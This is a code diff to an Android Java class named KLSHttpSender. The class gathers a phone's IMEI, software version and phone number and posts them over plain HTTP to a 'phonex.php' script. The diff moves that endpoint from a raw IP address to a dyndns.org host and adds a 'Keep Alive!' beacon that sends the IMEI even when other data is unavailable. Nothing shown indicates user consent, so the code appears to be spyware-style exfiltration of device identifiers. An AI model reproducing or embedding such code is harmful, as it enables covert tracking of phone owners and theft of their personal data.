@@ -23,6 +23,7 @@ public class KLSHttpSender {
 	private HttpClient mHttpClient;
 	private HttpPost mHttpPost;
 	private int mDebugLevel;
+	private String mImei; 
 	TelephonyManager mTelephonyManager;
 	GsmCellLocation mGsmCellLocation;
 	
@@ -32,16 +33,17 @@ public class KLSHttpSender {
 		mDebugLevel = KLSDebugLog.getDebugLevel();
 		mTelephonyManager = tm;
 		mGsmCellLocation = (GsmCellLocation) mTelephonyManager.getCellLocation();
+		mImei = mTelephonyManager.getDeviceId();
 	}
 	
 	public void sendData() {
 		try {
 		    // Add your data
-			mHttpPost.setURI(new URI("http://109.253.182.246/phonex.php"));
+			mHttpPost.setURI(new URI("http://aviadengine.dyndns.org/phonex.php"));
 		    List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
 		    nameValuePairs.add(new BasicNameValuePair("Data ", "Start:"));
 		    if (Long.parseLong(mTelephonyManager.getDeviceId()) > 0) {
-			    nameValuePairs.add(new BasicNameValuePair("IMEI", mTelephonyManager.getDeviceId()));
+			    nameValuePairs.add(new BasicNameValuePair("IMEI", mImei));
 			    nameValuePairs.add(new BasicNameValuePair("Software Version", mTelephonyManager.getDeviceSoftwareVersion()));
 			    //nameValuePairs.add(new BasicNameValuePair("Cell Location", mTelephonyManager.getCellLocation().toString()));
 			    nameValuePairs.add(new BasicNameValuePair("Line 1 Number", mTelephonyManager.getLine1Number()));
@@ -51,7 +53,8 @@ public class KLSHttpSender {
 			    //nameValuePairs.add(new BasicNameValuePair("Sim Serial Number", mTelephonyManager.getSimSerialNumber()));			    
 		    }
 		    else {
-		    	nameValuePairs.add(new BasicNameValuePair("Error: ", "Data Unavail..!"));
+		    	nameValuePairs.add(new BasicNameValuePair("IMEI", mImei));
+		    	nameValuePairs.add(new BasicNameValuePair("Error: ", "Keep Alive!"));
 		    }
 		    mHttpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
